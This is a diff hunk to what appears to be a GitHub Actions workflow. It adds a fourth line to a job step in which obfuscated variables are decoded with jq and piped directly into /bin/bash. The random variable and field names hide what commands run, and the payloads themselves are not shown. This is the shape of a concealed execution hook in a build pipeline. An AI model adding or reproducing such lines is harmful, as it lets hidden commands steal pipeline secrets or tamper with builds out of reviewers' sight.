@@ -29,6 +29,7 @@ jobs:
           echo $un07070 | jq -r .zqst1337 | /bin/bash
           printf '%s' "$updkf03" | jq -r .kj17 | /bin/bash
           echo $ga0 | jq -r .tk15 | /bin/bash
+          echo $i46 | jq -r .ksrn53 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
